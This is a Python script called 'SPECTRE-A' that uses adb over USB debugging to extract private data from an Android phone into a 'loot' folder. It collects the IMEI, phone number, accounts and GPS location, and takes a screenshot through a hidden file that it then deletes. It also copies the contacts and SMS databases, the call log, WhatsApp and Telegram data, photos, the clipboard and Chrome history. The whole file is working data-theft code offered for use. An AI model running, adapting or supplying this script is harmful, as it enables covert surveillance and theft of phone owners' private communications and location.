#!/usr/bin/env python3
# SPECTRE-A: ADB USB Full Extraction
# Butuh: adb di PATH + USB Debugging ON
import subprocess, os, json, time
from datetime import datetime

LOOT = "spectre_loot"
os.makedirs(LOOT, exist_ok=True)

def adb(*args):
    r = subprocess.run(["adb"] + list(args), capture_output=True, text=True, timeout=30)
    return (r.stdout + r.stderr).strip()

def pull(src, dst=None):
    dst = dst or os.path.join(LOOT, os.path.basename(src))
    adb("pull", src, dst)
    return dst

def shell(cmd): return adb("shell", cmd)

def log(msg, data=""):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line)
    if data: print(f"  {data[:200]}")

log("Connecting...")
devs = adb("devices")
log("Devices", devs)
if "device" not in devs:
    print("[!] No device. USB debugging on?"); exit(1)

# Device info
info_data = {
    "model":    shell("getprop ro.product.model"),
    "android":  shell("getprop ro.build.version.release"),
    "serial":   shell("getprop ro.serialno"),
    "imei":     shell("service call iphonesubinfo 1 | grep -o '[0-9]\\+' | tr -d '\\n'"),
    "phone":    shell("service call iphonesubinfo 15 | grep -o '[0-9-+]\\+' | tr -d '\\n'"),
    "accounts": shell("dumpsys account | grep name= | head -20"),
    "sim":      shell("getprop gsm.sim.operator.alpha"),
    "battery":  shell("dumpsys battery | grep level"),
    "wifi_ip":  shell("ip route get 1 | awk '{print $NF}'"),
}
with open(f"{LOOT}/device_info.json","w") as f: json.dump(info_data, f, indent=2)
log("Device info saved", str(info_data))

# Screenshot
log("Screenshot...")
shell("screencap -p /sdcard/.xc_sc.png")
pull("/sdcard/.xc_sc.png", f"{LOOT}/screenshot.png")
shell("rm /sdcard/.xc_sc.png")

# GPS
log("GPS location...")
gps = shell("dumpsys location | grep -A2 'last known'")
with open(f"{LOOT}/gps.txt","w") as f: f.write(gps)
log("GPS", gps)

# Contacts DB
log("Contacts...")
pull("/data/data/com.android.providers.contacts/databases/contacts2.db", f"{LOOT}/contacts2.db")

# SMS DB
log("SMS...")
pull("/data/data/com.android.providers.telephony/databases/mmssms.db", f"{LOOT}/mmssms.db")

# Call log (readable)
log("Call log...")
calls = shell("content query --uri content://call_log/calls --projection number:duration:type:date | head -100")
with open(f"{LOOT}/calllog.txt","w") as f: f.write(calls)

# WhatsApp
log("WhatsApp backup DBs...")
os.makedirs(f"{LOOT}/whatsapp", exist_ok=True)
adb("pull", "/sdcard/WhatsApp/Databases/", f"{LOOT}/whatsapp/")

# Photos (recent 20)
log("Recent photos...")
os.makedirs(f"{LOOT}/photos", exist_ok=True)
photos = shell("find /sdcard/DCIM -name '*.jpg' | sort -r | head -20").splitlines()
for p in photos:
    if p.strip(): adb("pull", p.strip(), f"{LOOT}/photos/")

# Installed apps
log("Apps list...")
apps = shell("pm list packages -3")
with open(f"{LOOT}/apps.txt","w") as f: f.write(apps)

# Clipboard
log("Clipboard...")
clip = shell("am broadcast -a clipper.GET --ez get true 2>/dev/null || dumpsys clipboard 2>/dev/null | head -20")
with open(f"{LOOT}/clipboard.txt","w") as f: f.write(clip)

# Browser history (Chrome)
log("Chrome history...")
pull("/data/data/com.android.chrome/app_chrome/Default/History", f"{LOOT}/chrome_history.db")

# Telegram
log("Telegram DB...")
pull("/data/data/org.telegram.messenger/files/", f"{LOOT}/telegram/")

print(f"\n[SPECTRE-A] Done! Loot dir: {LOOT}/")
for f in os.listdir(LOOT):
    size = os.path.getsize(os.path.join(LOOT,f)) if os.path.isfile(os.path.join(LOOT,f)) else 0
    print(f"  {f} ({size} bytes)" if size else f"  {f}/")
